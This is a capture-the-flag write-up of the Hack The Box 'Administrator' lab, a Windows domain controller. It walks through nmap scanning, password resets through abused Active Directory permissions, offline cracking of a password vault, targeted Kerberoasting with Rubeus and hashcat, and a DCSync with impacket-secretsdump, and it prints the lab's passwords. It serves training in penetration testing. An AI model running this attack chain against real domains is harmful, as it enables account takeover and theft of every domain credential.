# Administrator Write-up - HTB

## Recon

Starting of with nmap scan:

```
sudo nmap -sS -Pn -n -p- 10.10.11.42 -oN syn_all_port_scan.txt
```

```
PORT      STATE SERVICE
21/tcp    open  ftp
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
53573/tcp open  unknown
58810/tcp open  unknown
58821/tcp open  unknown
58826/tcp open  unknown
58829/tcp open  unknown
58842/tcp open  unknown
```

Now using these ports to run a vulnerability scan:

```
PORT=$(grep "open" syn_all_port_scan.txt | awk -F '/' '{print $1}' | tr '\n' ',' | sed 's/,$//'); sudo nmap -sVC -p ${PORT} -Pn -n -oN vuln_scan.txt 10.10.11.42
```

```
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-27 02:47:19Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
53573/tcp open  msrpc         Microsoft Windows RPC
58810/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
58821/tcp open  msrpc         Microsoft Windows RPC
58826/tcp open  msrpc         Microsoft Windows RPC
58829/tcp open  msrpc         Microsoft Windows RPC
58842/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Seems to be a DC. Enumeration possible on FTP, LDAP and SMB.

Let's not forget this? "As is common in real life Windows pentests, you will start the Administrator box with credentials for the following account: Username: Olivia Password: ichliebedich"

I will use them on WinRM after quick enum.

## Enumeration:

### FTP:

<figure><img src="../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

Interesting.

### SMB:

```
└─$ smbclient -L \\10.10.11.42 -U Olivia
Password for [WORKGROUP\Olivia]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.42 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

### LDAP:

A lot of stuff showing up.&#x20;

### WinRM:

Tried port 47001, but refuses connection. Connected normally via wsman 5985. Will see later what happens on 47001.

```
*Evil-WinRM* PS C:\Users> whoami /all

USER INFORMATION
----------------

User Name            SID
==================== ============================================
administrator\olivia S-1-5-21-1088858960-373806567-254189436-1108


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.

```

I loaded up SharpHound.&#x20;

<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

Reset Michael's Password:

```
Set-ADAccountPassword -Identity michael -NewPassword (ConvertTo-SecureString "NewMichaelPass123!" -AsPlainText -Force) -Reset
```

Verify it worked:

```
Get-ADUser -Identity michael -Properties PasswordLastSet
```

Get his groups:

```
Get-ADPrincipalGroupMembership -Identity michael | Select-Object Name

Name
----
Domain Users
Remote Management Users
```

He can WinRM.

<figure><img src="../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>

Now, based on BloodHound we need to move once more to a new user, this time Benjamin.

```
Set-ADAccountPassword -Identity benjamin -NewPassword (ConvertTo-SecureString "NewPass123!" -AsPlainText -Force) -Reset
```

<figure><img src="../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>

Benjamin is a member of Share Moderators, interesting:

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

I tried running psexec, smbclient, seem KO.

Remember about FTP? Let's give it a try!

<figure><img src="../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

Let's crack the password!

```
pwsafe2john Backup.psafe3 > backup.hash
```

```
john --wordlist=/home/czr/HTB/rockyou.txt backup.hash
```

<figure><img src="../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>

Open the safe:

```
pwsafe Backup.psafe3
```

Extract Emily's password: ![](<../.gitbook/assets/image (51).png>)

Emily is part of Remote Management Users:

<figure><img src="../.gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>

JACKPOT!!!!!!!!!!!!!!!

<figure><img src="../.gitbook/assets/image (54).png" alt=""><figcaption></figcaption></figure>

We know we have GenericWrite, so let's do some Kerberoasting!

```
Set-ADUser -Identity ethan -ServicePrincipalNames @{Add="backup/ethan"} -Credential $emilyCreds
```

```
.\Rubeus.exe kerberoast /user:ethan /domain:administrator.htb /dc:10.10.11.42 /creduser:administrator.htb\emily /credpassword:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
```

<figure><img src="../.gitbook/assets/image (55).png" alt=""><figcaption></figcaption></figure>

Loaded hashcat:

```
hashcat -m 13100 ethan.hash /home/czr/HTB/rockyou.txt --force
```

CrackeD!

<figure><img src="../.gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>

Let's do DCSync!

```
impacket-secretsdump 'administrator.htb/ethan:limpbizkit@10.10.11.42'
```

<figure><img src="../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>

Couldn't get easier than that!
